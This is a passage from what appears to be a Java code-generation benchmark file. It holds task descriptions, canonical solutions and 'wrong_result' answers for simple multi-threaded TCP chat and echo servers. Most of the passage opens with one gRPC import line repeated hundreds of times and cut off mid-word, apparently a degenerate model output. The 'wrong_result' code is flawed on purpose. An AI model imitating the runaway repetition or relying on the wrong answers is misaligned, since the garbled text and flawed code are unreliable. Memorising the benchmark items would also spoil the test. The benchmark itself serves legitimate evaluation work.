io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.ProtoReflectionServiceGrpc;\nimport io.grpc.protobuf.lite.Proto"
  },
  {
    "Task_id": 516,
    "Instruction": "Task Description: Implement a TCP server class that handles multiple client connections simultaneously, providing predefined chat responses to incoming messages.\n\nClass Description: TCPServer is a Java class that creates a TCP server listening on a specified port. It maintains a set of predefined messages and can handle multiple client connections concurrently, responding with random messages from its predefined set. The server can be started and stopped as needed.\n\nAttributes:\n- mIsServiceDestoryed: boolean - Flag indicating whether the server should stop running\n- mDefinedMessages: String[] - Array of predefined messages to send to clients\n\nMethods:\n- startServer() -> void - Starts the TCP server in a new thread\n- stopServer() -> void - Stops the TCP server by setting the termination flag\n- TcpServer (inner class) run() -> void - Main server loop that accepts client connections (implements Runnable)\n- responseClient(Socket client) -> void - Handles communication with an individual client\n  - Input: client: Socket - The client socket connection\n  - Output: (none) - Sends responses to client through the socket",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.io.PrintWriter;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Random;\n\npublic class TCPServer {\n\n    private boolean mIsServiceDestoryed = false;\n    private String[] mDefinedMessages = new String[] {\n            \"\u4f60\u597d\u554a\uff0c\u54c8\u54c8\",\n            \"\u8bf7\u95ee\u4f60\u53eb\u4ec0\u4e48\u540d\u5b57\u5440\uff1f\",\n            \"\u4eca\u5929\u5317\u4eac\u5929\u6c14\u4e0d\u9519\u554a\uff0cshy\",\n            \"\u4f60\u77e5\u9053\u5417\uff1f\u6211\u53ef\u662f\u53ef\u4ee5\u548c\u591a\u4e2a\u4eba\u540c\u65f6\u804a\u5929\u7684\u54e6\",\n            \"\u7ed9\u4f60\u8bb2\u4e2a\u7b11\u8bdd\u5427\uff1a\u636e\u8bf4\u7231\u7b11\u7684\u4eba\u8fd0\u6c14\u4e0d\u4f1a\u592a\u5dee\uff0c\u4e0d\u77e5\u9053\u771f\u5047\u3002\"\n    };\n\n    public void startServer() {\n        new Thread(new TcpServer()).start();\n    }\n\n    public void stopServer() {\n        mIsServiceDestoryed = true;\n    }\n\n    private class TcpServer implements Runnable {\n        @Override\n        public void run() {\n            ServerSocket serverSocket = null;\n            try {\n                serverSocket = new ServerSocket(8688);\n            } catch (IOException e) {\n                System.err.println(\"establish tcp server failed, port:8688\");\n                e.printStackTrace();\n                return;\n            }\n\n            while (!mIsServiceDestoryed) {\n                try {\n                    final Socket client = serverSocket.accept();\n                    System.out.println(\"accept\");\n                    new Thread() {\n                        @Override\n                        public void run() {\n                            try {\n                                responseClient(client);\n                            } catch (IOException e) {\n                                e.printStackTrace();\n                            }\n                        };\n                    }.start();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    private void responseClient(Socket client) throws IOException {\n        BufferedReader in = new BufferedReader(new InputStreamReader(\n                client.getInputStream()));\n        PrintWriter out = new PrintWriter(new BufferedWriter(\n                new OutputStreamWriter(client.getOutputStream())), true);\n        out.println(\"\u6b22\u8fce\u6765\u5230\u804a\u5929\u5ba4\uff01\");\n        while (!mIsServiceDestoryed) {\n            String str = in.readLine();\n            System.out.println(\"msg from client:\" + str);\n            if (str == null) {\n                break;\n            }\n            int i = new Random().nextInt(mDefinedMessages.length);\n            String msg = mDefinedMessages[i];\n            out.println(msg);\n            System.out.println(\"send :\" + msg);\n        }\n        System.out.println(\"client quit.\");\n        out.close();\n        in.close();\n        client.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class TCPServer {\n    private boolean mIsServiceDestroyed = false;\n    private String[] mDefinedMessages;\n    private int port;\n\n    public TCPServer(int port, String[] messages) {\n        this.port = port;\n        this.mDefinedMessages = messages;\n    }\n\n    public void startServer() {\n        new Thread(new TcpServer()).start();\n    }\n\n    public void stopServer() {\n        mIsServiceDestroyed = true;\n    }\n\n    private class TcpServer implements Runnable {\n        @Override\n        public void run() {\n            try (ServerSocket serverSocket = new ServerSocket(port)) {\n                while (!mIsServiceDestroyed) {\n                    Socket client = serverSocket.accept();\n                    responseClient(client);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void responseClient(Socket client) {\n        new Thread(() -> {\n            try (\n                BufferedReader in = new BufferedReader(new InputStreamReader(client.getInputStream()));\n                PrintWriter out = new PrintWriter(client.getOutputStream(), true)\n            ) {\n                String inputLine;\n                while ((inputLine = in.readLine()) != null) {\n                    if (inputLine.trim().isEmpty()) continue;\n                    String response = getRandomMessage();\n                    out.println(response);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            } finally {\n                try {\n                    client.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }).start();\n    }\n\n    private String getRandomMessage() {\n        return mDefinedMessages[(int) (Math.random() * mDefinedMessages.length)];\n    }\n}"
  },
  {
    "Task_id": 517,
    "Instruction": "Task Description: Create a TCP server class that listens for incoming client connections, processes client requests, and sends responses back using a thread pool for handling multiple concurrent connections.\n\nClass Description: The ViewServer class implements a TCP server that listens on a specified port, accepts client connections, and handles each connection in a separate worker thread using a fixed-size thread pool. The server can send data to connected clients and process incoming requests.\n\nAttributes:\n- mServer: ServerSocket - The server socket that listens for incoming connections  \n- mPort: int - The port number on which the server listens  \n- mThread: Thread - The thread in which the server runs  \n- mThreadPool: ExecutorService - The thread pool for handling client connections  \n\nMethods:\n- start() -> boolean - Starts the server thread and initializes the thread pool. Returns true if successful, false if already running  \n- run() - The main server loop that accepts incoming connections and delegates them to worker threads  \n- writeValue(Socket client, String value) -> boolean - Writes a string value to the specified client socket. Returns true if successful, false otherwise  \n- ViewServerWorker(Socket client) - Constructor for the inner worker class that handles individual client connections  \n- ViewServerWorker.run() - Processes an individual client connection, reading requests and sending responses  \n\nInner Class:\nViewServerWorker - Handles individual client connections with these methods:\n- run() - Reads client input, processes the request, and manages connection cleanup",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.io.OutputStreamWriter;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class ViewServer implements Runnable {\n    private static final int VIEW_SERVER_DEFAULT_PORT = 4939;\n    private static final int VIEW_SERVER_MAX_CONNECTIONS = 10;\n    \n    private ServerSocket mServer;\n    private final int mPort;\n    private Thread mThread;\n    private ExecutorService mThreadPool;\n\n    private ViewServer(int port) {\n        mPort = port;\n    }\n\n    public boolean start() throws IOException {\n        if (mThread != null) {\n            return false;\n        }\n\n        mThread = new Thread(this, \"Local View Server [port=\" + mPort + \"]\");\n        mThreadPool = Executors.newFixedThreadPool(VIEW_SERVER_MAX_CONNECTIONS);\n        mThread.start();\n\n        return true;\n    }\n\n    public void run() {\n        try {\n            mServer = new ServerSocket(mPort, VIEW_SERVER_MAX_CONNECTIONS, InetAddress.getLocalHost());\n        } catch (Exception e) {\n            Log.w(LOG_TAG, \"Starting ServerSocket error: \", e);\n        }\n\n        while (mServer != null && Thread.currentThread() == mThread) {\n            try {\n                Socket client = mServer.accept();\n                if (mThreadPool != null) {\n                    mThreadPool.submit(new ViewServerWorker(client));\n                } else {\n                    try {\n                        client.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n            } catch (Exception e) {\n                Log.w(LOG_TAG, \"Connection error: \", e);\n            }\n        }\n    }\n\n    private static boolean writeValue(Socket client, String value) {\n        boolean result;\n        BufferedWriter out = null;\n        try {\n            OutputStream clientStream = client.getOutputStream();\n            out = new BufferedWriter(new OutputStreamWriter(clientStream), 8 * 1024);\n            out.write(value);\n            out.write(\"\\n\");\n            out.flush();\n            result = true;\n        } catch (Exception e) {\n            result = false;\n        } finally {\n            if (out != null) {\n                try {\n                    out.close();\n                } catch (IOException e) {\n                    result = false;\n                }\n            }\n        }\n        return result;\n    }\n\n    private class ViewServerWorker implements Runnable {\n        private Socket mClient;\n\n        public ViewServerWorker(Socket client) {\n            mClient = client;\n        }\n\n        public void run() {\n            BufferedReader in = null;\n            try {\n                in = new BufferedReader(new InputStreamReader(mClient.getInputStream()), 1024);\n                final String request = in.readLine();\n\n                // Process client request and send response\n                // ... (omitted for brevity)\n\n            } catch(IOException e) {\n                Log.w(LOG_TAG, \"Connection error: \", e);\n            } finally {\n                if (in != null) {\n                    try {\n                        in.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n                if (mClient != null) {\n                    try {\n                        mClient.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class ViewServer {\n    private ServerSocket mServer;\n    private int mPort;\n    private Thread mThread;\n    private ExecutorService mThreadPool;\n\n    public ViewServer(int port) {\n        mPort = port;\n    }\n\n    public boolean start() {\n        if (mThread != null && mThread.isAlive()) {\n            return false;\n        }\n        try {\n            mServer = new ServerSocket(mPort);\n            mThreadPool = Executors.newFixedThreadPool(10);\n            mThread = new Thread(this::run);\n            mThread.start();\n            return true;\n        } catch (IOException e) {\n            return false;\n        }\n    }\n\n    public void run() {\n        while (true) {\n            try {\n                Socket client = mServer.accept();\n                mThreadPool.submit(new ViewServerWorker(client));\n            } catch (IOException e) {\n                // Handle exception\n            }\n        }\n    }\n\n    public boolean writeValue(Socket client, String value) {\n        try (PrintWriter out = new PrintWriter(client.getOutputStream(), true)) {\n            out.println(value);\n            return true;\n        } catch (IOException e) {\n            return false;\n        }\n    }\n\n    private class ViewServerWorker implements Runnable {\n        private final Socket client;\n\n        public ViewServerWorker(Socket client) {\n            this.client = client;\n        }\n\n        @Override\n        public void run() {\n            try (BufferedReader in = new BufferedReader(new InputStreamReader(client.getInputStream()));\n                 PrintWriter out = new PrintWriter(client.getOutputStream(), true)) {\n                String inputLine;\n                while ((inputLine = in.readLine()) != null) {\n                    out.println(\"Echo: \" + inputLine);\n                }\n            } catch (IOException e) {\n                // Handle exception\n            } finally {\n                try {\n                    client.close();\n                } catch (IOException e) {\n                    // Handle\n                }\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 518,
    "Instruction": "Task Description: Create a Java class that implements a TCP server for unicast communication, handling client connections and data exchange with configurable parameters for testing purposes.\n\nClass Description: UnicastTestTcpRpc is a TCP server implementation that listens for incoming client connections, processes requests, and manages data transmission with configurable buffer sizes and communication modes (synchronous/asynchronous).\n\nAttributes:\n- srv_sock: [ServerSocket] - The server socket listening for incoming connections\n- sock: [Socket] - The active client connection socket\n- sock_in: [DataInputStream] - Input stream for reading data from the client\n- sock_out: [DataOutputStream] - Output stream for writing data to the client\n\nMethods:\n- init(long, boolean, boolean, boolean, boolean, String, int, int) -> [void] - Initializes the server with configuration parameters and starts the acceptor thread\n  Parameters:\n    - sleep_time: [long] - Sleep time between operations\n    - exit_on_end: [boolean] - Whether to exit after processing\n    - busy_sleep: [boolean] - Use busy waiting instead of sleep\n    - sync: [boolean] - Use synchronous communication\n    - oob: [boolean] - Use out-of-band data\n    - addr: [String] - Address to connect to\n    - local_port: [int] - Local port to listen on\n    - dest_port: [int] - Destination port for connections\n\n- createSocket() -> [void] - Creates a new client socket connection if none exists\n- handleRequest(DataInputStream, DataOutputStream) -> [boolean] - Processes incoming client requests\n  Parameters:\n    - in: [DataInputStream] - Input stream from client\n    - out: [DataOutputStream] - Output stream to client\n  Returns: [boolean] - Whether to continue processing requests\n\n- set(Socket) -> [void] - Configures socket parameters (TCP_NODELAY, buffer sizes)\n  Parameters:\n    - socket: [Socket] - Socket to configure\n\n- stop() -> [void] - Closes all open sockets and releases resources\n- startTest(int) -> [void] - Starts the test with given parameters\n  Parameters:\n    - num: [int] - Test parameter\n\n- receiveData(long, byte[]) -> [void] - Handles received data from client\n  Parameters:\n    - val: [long] - Timestamp or identifier\n    - data: [byte[]] - Received data payload",
